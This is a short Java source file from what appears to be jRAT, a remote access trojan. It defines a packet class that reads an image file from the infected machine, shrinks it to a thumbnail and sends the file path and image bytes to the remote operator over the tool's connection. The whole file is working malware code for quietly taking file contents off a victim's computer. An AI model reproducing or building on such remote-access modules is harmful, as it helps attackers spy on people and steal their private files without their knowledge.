package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;
import jrat.common.utils.ImageUtils;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;

public class Packet59ThumbnailPreview implements OutgoingPacket {

	private String file;

	public Packet59ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(file);

		BufferedImage image = ImageIO.read(new File(file));
		image = ImageUtils.resize(image, 150, 100);

		byte[] buffer = ImageUtils.encode(image);

        con.writeInt(buffer.length);
        con.write(buffer);
	}

	@Override
	public short getPacketId() {
		return 59;
	}

}
